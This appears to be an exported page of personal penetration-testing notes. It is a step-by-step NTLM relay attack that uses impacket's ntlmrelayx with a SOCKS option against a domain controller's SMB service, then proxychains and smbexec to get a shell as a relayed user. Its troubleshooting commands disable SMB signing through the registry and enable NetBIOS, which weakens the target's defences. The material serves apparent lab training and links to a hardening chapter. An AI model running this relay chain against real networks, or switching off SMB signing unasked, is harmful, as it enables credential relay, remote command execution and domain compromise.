<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Target SMB service (and connection with proxychains)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Target SMB service (and connection with proxychains)</h1><br/><br /><div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>doc<span style="color:#ff9d00;font-weight:700">/</span>python3-impacket<span style="color:#ff9d00;font-weight:700">/</span>examples<br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>$ python3 ntlmrelayx.py -6 -wh attackerFox.daniele.local --target smb<span style="color:#ff9d00;font-weight:700">://</span>&lt;IpDomainController&gt;  --lootdir lootme -socks</pre></div><br />OPTIONS:<br />      ◇  <a href=""><img src="images/1257-1.png" alt="images/1257-1.png" /></a><br />      ◇ <a href=""><img src="images/1257-2.png" alt="images/1257-2.png" /></a><br />      ◇ <a href=""><img src="images/1257-3.png" alt="images/1257-3.png" /></a><br />           With the SOCKS option the authenticated sessions will be hold active, so it can later on be used and reused through a SOCKS proxy.<br />            This will allow us to connect with the shell of the target(only possible with the SMB service)<br /><br />OUTPUT:<br /><a href=""><img src="images/1257-4.png" alt="images/1257-4.png" /></a><br />1. This means that we have a socks proxy<br />    <div class="codebox"><pre>socks</pre></div><br />    <a href=""><img src="images/1257-5.png" alt="images/1257-5.png" /></a><br /> <br /><br />Now we have to connect with this SOCKS!<br />2. edit proxychains.conf<br />    <div class="codebox"><pre>mousepad <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>proxychains.conf</pre></div><br />    <a href=""><img src="images/1257-6.png" alt="images/1257-6.png" /></a><br /><br />3. Use smbexec.py to connect<br />    <div class="codebox"><pre>proxychains python3 smbexec.py daniele<span style="color:#ff9d00;font-weight:700">/</span>pparker@&lt;IpDomainController&gt; -no-pass</pre></div><br />    <a href=""><img src="images/1257-7.png" alt="images/1257-7.png" /></a><br />   ◇ <span style="color:#ff0000;">possible error: STATUS ACCESS DENIED</span><br />       <a href=""><img src="images/1257-8.png" alt="images/1257-8.png" /></a><br />       If we have as output STATUS_ACCESS_DENIED is because &quot;SMB signing&quot; is enabled (as we will seen in <a href="t_Methodology--Network_Pentest--Sniffing-Spoofing-Poisoning--NetNTLM_attacks--How_Increase_security_against--NTLM_relay_attacks_using_SMB.html">Increase Security</a> chapter).  Good for the company :)<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg query HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanmanServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters <span style="color:#ff9d00;font-weight:700">/</span>v RequireSecuritySignature<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg add HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>System<span style="color:#ff9d00;font-weight:700">\</span>CurrentControlSet<span style="color:#ff9d00;font-weight:700">\</span>Services<span style="color:#ff9d00;font-weight:700">\</span>LanmanServer<span style="color:#ff9d00;font-weight:700">\</span>Parameters <span style="color:#ff9d00;font-weight:700">/</span>v RequireSecuritySignature <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">/</span>f</pre></div><br />        <a href=""><img src="images/1257-9.png" alt="images/1257-9.png" /></a><br />        <a href=""><img src="images/1257-10.png" alt="images/1257-10.png" /></a><br />        After the change the DC need a restart<br />   ◇ <span style="color:#ff0000;">possible error: NETBIOS connection with the remote host timed out</span><br />       <a href=""><img src="images/1257-11.png" alt="images/1257-11.png" /></a><br />        This happen because NETBIOS is not enabled over TCP/IP (IPv4)! Good for the company :)<br />        To enable it:<br />        Control Panel\Network and Internet\Network Connections → properties(right click) → Internet Protocol Version 4 (TCP/IPv4) → Advanced → WINS → Enable NetBIOS over TCP/IP<br />        <a href=""><img src="images/1257-12.png" alt="images/1257-12.png" /></a><br />    <br />    <br /><br /><br /><br />Bibliography:<br /><a href="https://www.secureauth.com/blog/playing-with-relayed-credentials/">https://www.secureauth.com/blog/playing-with-relayed-credentials/</a></div>
</body>
</html>
